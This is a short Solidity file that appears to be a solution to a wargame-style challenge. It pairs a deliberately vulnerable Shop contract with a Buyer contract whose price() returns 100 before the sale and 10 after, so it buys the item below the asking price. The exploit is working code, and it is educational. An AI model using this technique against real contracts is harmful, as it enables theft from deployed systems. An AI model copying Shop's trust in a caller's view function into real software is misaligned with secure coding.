// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Shop {
  uint public price = 100;
  bool public isSold;
  function buy() public {
    Buyer _buyer = Buyer(msg.sender);  

    //  msg.sender is contract address here so only contract can can call this buy() function (not EOA ) 

    if (_buyer.price() >= price && !isSold) 
    {
      isSold = true;
      price = _buyer.price();
    }
  }
}


contract Buyer 
{
  Shop adr;
  constructor(address j)
  {
    adr =Shop(j);
  }
  function start() public 
  {
    adr.buy();
  }
  function price() external view returns (uint)
  {
    if(!adr.isSold())
    {
      return 100;
    }
    return 10;
  }

}

